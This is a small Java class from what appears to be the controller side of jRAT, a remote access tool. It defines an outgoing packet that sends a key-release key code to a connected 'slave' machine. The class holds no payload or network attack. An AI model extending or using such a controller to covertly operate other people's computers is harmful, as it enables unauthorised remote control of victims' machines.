package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet95KeyRelease implements OutgoingPacket {

	private int keyCode;

	public Packet95KeyRelease(int keyCode) {
		this.keyCode = keyCode;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(keyCode);
	}

	@Override
	public short getPacketId() {
		return 95;
	}

}
